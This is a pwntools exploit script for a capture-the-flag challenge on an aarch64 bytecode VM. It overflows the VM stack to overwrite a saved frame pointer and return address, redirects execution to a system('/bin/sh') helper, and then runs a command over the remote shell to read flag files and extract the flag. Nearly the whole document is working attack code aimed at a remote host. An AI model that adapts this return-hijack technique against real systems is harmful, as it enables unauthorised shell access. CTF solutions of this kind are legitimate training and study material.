from pwn import *
import re


context.arch = "aarch64"
context.log_level = "info"

HOST = "marauder-might.ctf.ritsec.club"
PORT = 1739

OP_CONSTANT = 0
OP_RETURN = 1

# 400780:
#   adrp x0, "/bin/sh"
#   bl   402300          ; wrapper around system()
SHELL_HELPER = 0x400780

# 400890 allocates a 0x820-byte frame and uses sp+0x10 as the VM stack base.
# 4009c0's saved x29/x30 sit 0x810/0x818 bytes above that base.
PUSHES_TO_SAVED_X29 = 0x810 // 8 + 1
PUSHES_TO_SAVED_X30 = 0x818 // 8 + 1


def push(idx: int) -> bytes:
    return bytes((OP_CONSTANT, idx))


def build_payload() -> bytes:
    constants = [
        p64(0),
        p64(SHELL_HELPER),
    ]

    bytecode = []

    # Fill until we land on 4009c0's saved frame.
    for _ in range(PUSHES_TO_SAVED_X29 - 1):
        bytecode.append(push(0))

    # saved x29
    bytecode.append(push(0))

    # saved x30 -> 0x400780
    bytecode.append(push(1))

    # Keep the printed return value clean: OP_RETURN pops the top stack slot.
    bytecode.append(push(0))
    bytecode.append(push(0))

    bytecode.append(bytes((OP_RETURN,)))

    return p32(len(constants)) + b"".join(constants) + b"".join(bytecode)


def main():
    io = remote(HOST, PORT)

    payload = build_payload()
    io.send(payload)

    # The hijacked return lands in system("/bin/sh"), so we can issue a shell command.
    io.sendline(b"cat /flag* flag* /home/*/flag* 2>/dev/null; echo __DONE__; exit")

    data = io.recvrepeat(3)
    print(data.decode("latin-1", errors="replace"))

    match = re.search(rb"RS\{[^}\n]+\}", data)
    if match:
        log.success(f"flag: {match.group().decode()}")
    else:
        log.warning("flag not found in captured output")


if __name__ == "__main__":
    main()
